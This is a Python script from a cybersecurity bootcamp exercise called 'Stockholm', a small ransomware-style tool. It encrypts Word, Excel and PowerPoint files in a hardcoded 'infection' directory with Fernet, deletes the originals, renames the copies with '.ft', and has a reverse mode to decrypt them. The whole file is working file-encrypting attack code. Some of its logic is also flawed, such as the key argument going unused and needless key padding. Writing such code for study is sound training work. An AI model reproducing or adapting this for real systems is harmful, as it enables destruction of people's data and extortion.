__author__ = "abelrodr"
__date__ = "2023/05/17 11:23:29"
__copyright__ = "Copyright 2023, Cybersec Bootcamp Malaga"
__credits__ = ["abelrodr"]
__email__ = "abelrodr42malaga@gmail.com"

print('''\033[1;31m
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
@%%%%%%%%%%%%%%%%%%@.@%%%%%%%%%%%%%%%%%%
@%%%%%%%@%%%%%@%@.......@%&%%%%%@%%%%%%%
@%%%%%%%%@...%@.%%@...@%%@*%*..@%%%%%%%%
@%%%%%%%%%%@...@....@....%...@%%%%%%%%%%
@%%%%%%%%%%%@..,.........%@.@%%%%%%%%%%%
@%%%%%%%%%(......@@...@@@@.@...%%%%%%%%%
@%%%%%%%%@...@..@..@...#%..@....%%%%%%%%
@%%%%%%%%@.................@...@%%%%%%%%
@@%%%%%%%%%...@....@@@...%@@..%%%%%%%%%%
@@%%%%%%%%%%%.@...........@.&%%%%%%%%%%@
@@@%%%%%%%%.*..@.........@@...@%%%%%%%@@
@@@&%%%%%%%%@.@...@...@@..@.@%%%%%%%%%@@
@@@@@%%%%%%%%%%...........@%%%%%%%%%@@@@
@@@@@@%%%%%%%%.............@%%%%%%%@@@@@
@@@@@@@@@%%%%%%%%%%%%%%%%%%%%%%%&@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%%%%%%&@@@@@@@@@@
@@@@@@@@@@@@@@@@%%%%%%%%%&@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@
    
''')

# Library imports

import os
import argparse
from cryptography.fernet import Fernet

# Constants

INFECTION_DIR = "/Users/abelrodr/infection"
AFFECTED_EXTENSIONS = [".doc", ".ppt", ".xls", ".docx", ".pptx", ".xlsx"]

# Parsing

parser = argparse.ArgumentParser(description="Stockholm")
parser.add_argument("-k", "--key", help="Key to encrypt/decrypt files")
parser.add_argument("-kf", "--keyfile", default="key.txt", help="File containing the key to encrypt/decrypt files")
parser.add_argument("-v", "--version", help="Show version", action="store_true")
parser.add_argument("-r", "--reverse", help="Decrypt files")
parser.add_argument("-s", "--silent", help="Silent mode", action="store_true")

args = parser.parse_args()

# Functions

def write_key_to_file(file_path):
    key = Fernet.generate_key()
    with open(file_path, "wb") as f:
        f.write(key)
    print(f"Key written to {file_path}")
    return key

# If key is not provided, generate one and write it to a file
if not args.key:
    key = write_key_to_file(args.keyfile)
else:
    # Read key from file
    with open(args.keyfile, "rb") as f:
        key = f.read()

# If the key is not 16 bytes long, put white spaces at the end
if len(key) < 16:
    key += b" " * (16 - len(key))

if args.reverse:
    # Decrypt files
    key = args.reverse.encode()
    if len(key) < 16:
        key += b" " * (16 - len(key))
    for filename in os.listdir(INFECTION_DIR):
        # Check if file is infected
        if filename.endswith(".ft"):
            # Check if file is reverted
            if not filename.endswith(".rft"):
                try:
                    # Read the file encrypted
                    with open(os.path.join(INFECTION_DIR, filename), "rb") as f:
                        encrypted_data = f.read()
                    # Decrypt the file
                    f = Fernet(key)
                    decrypted_data = f.decrypt(encrypted_data)
                    
                    # Write the decrypted file
                    with open(os.path.join(INFECTION_DIR, filename + ".rft"), "wb") as f:
                        f.write(decrypted_data)
                    
                    # Remove the encrypted file
                    os.remove(os.path.join(INFECTION_DIR, filename))
                    if not args.silent:
                        print(f"File {filename} decrypted")
                except Exception as e:
                    print(f"Error decrypting file {filename}: {e}")

else:
    # Encrypt every file in the infection directory
    for filename in os.listdir(INFECTION_DIR):
        # Check if file is infected
        if os.path.splitext(filename)[1].lower() in AFFECTED_EXTENSIONS:
            if not filename.endswith(".ft"):
                try:
                    # Read the file
                    with open(os.path.join(INFECTION_DIR, filename), "rb") as f:
                        data = f.read()
                    # Encrypt the file
                    f = Fernet(key)
                    encrypted_data = f.encrypt(data)
                    # Write the encrypted file
                    with open(os.path.join(INFECTION_DIR, filename + ".ft"), "wb") as f:
                        f.write(encrypted_data)
                    # Remove the original file
                    os.remove(os.path.join(INFECTION_DIR, filename))
                    if not args.silent:
                        print(f"File {filename} encrypted")
                except Exception as e:
                    print(f"Error encrypting file {filename}: {e}")
